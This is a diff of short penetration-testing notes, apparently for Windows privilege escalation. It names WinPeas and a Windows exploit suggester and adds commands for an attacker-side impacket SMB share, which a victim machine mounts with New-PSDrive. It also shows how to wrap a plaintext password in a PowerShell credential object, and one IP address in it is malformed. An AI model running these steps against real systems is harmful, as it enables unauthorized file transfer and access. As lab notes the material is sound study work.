@@ -1,3 +1,18 @@
 WinPeas.exe
 WindowsExploitSuggester.py
 
+Creating a shared SMB between attacking and victim machine
+
+attacker machine
+
+  $ impacket-smbserver -username whatever -password pass newshare $(pwd)
+ 
+Victim machine
+  
+  $ New-PSDrive -name newshare -root \\10.1014.7\newshare
+  
+Saving and using variables for passwords / creds in windows powershell
+
+  $pass = "password" | ConvertTo-SecureString -AsPlain -Force
+  
+  $cred = New-object System.Management.automation.pscredential('username',$pass)
